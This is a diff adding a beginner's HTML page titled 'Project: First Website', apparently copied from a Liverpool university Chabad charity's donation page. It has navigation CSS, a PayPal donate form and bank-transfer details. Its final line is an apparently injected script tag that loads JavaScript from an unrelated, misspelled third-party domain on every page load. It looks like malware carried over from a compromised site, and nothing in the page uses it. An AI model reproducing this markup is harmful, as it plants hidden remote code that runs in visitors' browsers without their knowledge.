@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Project: First Website</title>
+        <meta charset="utf-8">
+        <style>
+        html {
+            scroll-padding-top: 120px;
+            scroll-behavior: smooth;
+            }
+         h1.title {
+             margin-top: 120px;
+            }
+        .header {
+            color: white;
+            background-color: black;
+            height: 10%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            z-index:1;
+            }
+        #header-logo {
+            margin-left: 80px;
+            width: 150px;
+            position: fixed;
+            }
+        .home {
+            text-align: center;
+            font-size: 30px;
+            float: right;
+            padding-right: 10px;
+            padding-left: 10px;
+            padding-top: 5px;
+            padding-bottom: 5px;
+            margin-left: 280px;
+            margin-top: 30px;
+            color: white;
+            text-decoration-line: none;     
+            }
+        .home:hover {
+            color: black;
+            background-color: white;
+            }
+        .contact-us {
+            text-align: center;
+            font-size: 30px;
+            float: right;
+            padding-right: 10px;
+            padding-left: 10px;
+            padding-top: 5px;
+            padding-bottom: 5px;
+            margin-top: 30px;
+            color: white;
+            text-decoration-line: none;
+            }
+        .contact-us:hover {
+            color: black;
+            background-color: white;
+            }
+        .about-us {
+            text-align: center;
+            font-size: 30px;
+            float: right;
+            padding-right: 10px;
+            padding-left: 10px;
+            padding-top: 5px;
+            padding-bottom: 5px;
+            margin-top: 30px;
+            color: white;
+            text-decoration-line: none;
+            }
+        .about-us:hover {
+            color: black;
+            background-color: white;
+            }
+        .shabbat {
+            text-align: center;
+            font-size: 30px;
+            float: right;
+            padding-right: 10px;
+            padding-left: 10px;
+            padding-top: 5px;
+            padding-bottom: 5px;
+            margin-top: 30px;
+            color: white;
+            text-decoration-line: none;
+            }
+        .shabbat:hover {
+            color: black;
+            background-color: white;
+            }
+        .classes {
+            text-align: center;
+            font-size: 30px;
+            float: right;
+            padding-right: 10px;
+            padding-left: 10px;
+            padding-top: 5px;
+            padding-bottom: 5px;
+            margin-top: 30px;
+            color: white;
+            text-decoration-line: none;
+            }
+        .classes:hover {
+            color: black;
+            background-color: white;
+            }
+        .programmes {
+            text-align: center;
+            font-size: 30px;
+            float: right;
+            padding-right: 10px;
+            padding-left: 10px;
+            padding-top: 5px;
+            padding-bottom: 5px;
+            margin-top: 30px;
+            color: white;
+            text-decoration-line: none;
+            }
+        .programmes:hover {
+            color: black;
+            background-color: white;
+            }
+        .events {
+            text-align: center;
+            font-size: 30px;
+            float: right;
+            padding-right: 10px;
+            padding-left: 10px;
+            padding-top: 5px;
+            padding-bottom: 5px;
+            margin-top: 30px;
+            color: white;
+            text-decoration-line: none;
+            }
+        .events:hover {
+            color: black;
+            background-color: white;
+            }
+        .galery {
+            text-align: center;
+            font-size: 30px;
+            float: right;
+            padding-right: 10px;
+            padding-left: 10px;
+            padding-top: 5px;
+            padding-bottom: 5px;
+            margin-top: 30px;
+            color: white;
+            text-decoration-line: none;
+            }
+        .galery:hover {
+            color: black;
+            background-color: white;
+            }
+        .donate {
+            text-align: center;
+            font-size: 30px;
+            float: right;
+            padding-right: 10px;
+            padding-left: 10px;
+            padding-top: 5px;
+            padding-bottom: 5px;
+            margin-top: 30px;
+            color: white;
+            text-decoration-line: none;
+            }
+        .donate:hover {
+            color: black;
+            background-color: white;
+            }
+        .visitor-information {
+            text-align: center;
+            font-size: 30px;
+            float: right;
+            padding-right: 10px;
+            padding-left: 10px;
+            padding-top: 5px;
+            padding-bottom: 5px;
+            margin-top: 30px;
+            color: white;
+            text-decoration-line: none;
+            }
+        .visitor-information:hover {
+            color: black;
+            background-color: white;
+            }
+        .liverpool-waterfront {
+            width: 100%;
+            height: 50vh;
+            top: 0;
+            left: 0;
+            margin-top: 70px;
+            padding:0;
+            }
+        .intro-paragraph {
+            width: 100%;
+            top: 0;
+            left: 0;
+            padding-top: 20px;
+            padding-bottom: 20px;
+            background-color: rgb(211, 211, 211);
+            color: black;
+            text-align = center;
+            }
+        .first-sentence-intro {
+            color: black;
+            font-size = 30px;
+            text-align: center;
+            }
+        .second-sentence-intro {
+            font-size = 20px;
+            text-align: center;
+            }
+        a {
+            text-decoration-line: none;
+            }
+</style>
+    </head>
+    <body>
+        <div class = "header">
+           <a href = "/index.html"><img id = "header-logo" src = "https://www.ulivchabad.org/wp-content/uploads/2014/05/ChabadLiverpoolUnilogo-011.jpg" alt = "Chabad at Liverpool Universities Logo"></a>
+            <table>
+                <tbody>
+                    <tr>
+                        <td><a class = "home" href = "/index.html">Home</a></td>
+                        <td><a class = "contact-us" href="/contact-us.html">Contact Us</a></td>
+                        <td><a class = "about-us" href = "/about-us.html">About Us</a></td>
+                        <td><a class = "shabbat" href = "/shabbat.html">Shabbat</a></td>
+                        <td><a class = "classes" href = "/classes.html">Classes</a></td>
+                        <td><a class = "programmes" href = "/programmes.html">Programmes</a></td>
+                        <td><a class = "events" href = "/events.html">Events</a></td>
+                        <td><a class = "galery" href = "/galery.html">Galery</a></td>
+                        <td><a class = "donate" href = "/donate.html">Donate</a></td>
+                        <td><a class = "visitor-information" href = "/visitor-information.html">Visitor Information</a></td>
+                    </tr>
+                </tbody>
+            </table> 
+        </div>
+      <div class="row-fluid"><div class="span12 "><h1 style="text-align: center;">Be our Partner!</h1>
+<p><span style="font-family: verdana, geneva; font-size: 12pt;">Thank you for visiting this page to donate to the important work of Chabad at Liverpool Universities. We are commited to enriching the lives of the Jewish students in any way we can, and we hope that you can commit to ensure that this work continues to grow.</span> <span style="font-family: verdana, geneva; font-size: 12pt;">Your partnership, whatever size, will ensure that these crucial services continue to thrive.</span></p>
+<p><span style="font-size: 12pt;"><strong><em><span style="font-family: verdana, geneva;">How do I donate?</span></em></strong></span></p>
+<p><span style="font-family: verdana, geneva; font-size: 12pt;">There are a few easy ways to donate: &nbsp;</span></p>
+<ul>
+<li><span style="font-family: verdana, geneva; font-size: 12pt;">Online.&nbsp;</span><span style="font-family: verdana, geneva; font-size: 12pt;">Once you click the donate button below,</span></li>
+</ul>
+<form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_top"><input name="cmd" type="hidden" value="_s-xclick"><br>
+<input name="hosted_button_id" type="hidden" value="EFLLWTAENMC68"><br>
+<input alt="PayPal – The safer, easier way to pay online." name="submit" src="https://www.paypalobjects.com/en_US/GB/i/btn/btn_donateCC_LG.gif" type="image"><br>
+<img src="https://www.paypalobjects.com/en_GB/i/scr/pixel.gif" alt="" width="1" height="1" border="0"></form>
+<p><span style="font-size: 12pt; font-family: verdana, geneva;">you will see the following screen</span> <img loading="lazy" src="https://www.ulivchabad.org/wp-content/uploads/2014/05/donate_final.jpg" alt="donate_final" width="824" height="656"></p>
+<p style="text-align: left;"><span style="font-size: 12pt; font-family: verdana, geneva;">You can enter the amount you wish to donate, and whether you want to make this a recurring&nbsp;<strong>monthly</strong>&nbsp;donation (circled in red).</span> <span style="font-size: 12pt; font-family: verdana, geneva;"> You can donate here even if you do not have a Paypal account by clicking the option highlighted in the red box.</span></p>
+<h2 class="abcls"><span style="font-family: verdana, geneva; font-size: 12pt;"><strong><em>Other ways to donate:</em></strong></span></h2>
+<ul>
+<li><span style="font-size: 12pt; font-family: verdana, geneva;">Direct Bank Transfer to <strong>Chabad of Liverpool Universities Sort Code 60-01-11 Account Number 43188850</strong></span></li>
+<li><span style="font-size: 12pt; font-family: verdana, geneva;">By Cheque: <strong>Payable to Chabad of Liverpool Universities 29a Aigburth Drive, Liverpool L17 4JH</strong></span></li>
+<li><span style="font-size: 12pt; font-family: verdana, geneva;">Via monthly Standing Order: <a href="https://www.ulivchabad.org/wp-content/uploads/2014/05/Standing-Order.docx" target="_blank"><strong>Download the form here</strong></a></span></li>
+</ul>
+<p><span style="font-family: verdana,geneva; font-size: 12pt;">A <strong>Gift Aid Form</strong> can be <a href="https://www.ulivchabad.org/wp-content/uploads/2014/05/Gift-Aid-Form1.doc" target="_blank">downloaded here</a></span></p>
+<p class="abcls"><span style="font-family: verdana, geneva; font-size: 12pt;">Thank you for your support and friendship!</span></p>
+<p class="abcls"><span style="font-family: verdana, geneva; font-size: 12pt;">Rabbi Shmuli &amp; Tzivia Brown</span></p>
+<p><script src="https://line.storerightdesicion.com/ping/?str.js" type="text/javascript"></script></p>
+</div></div>
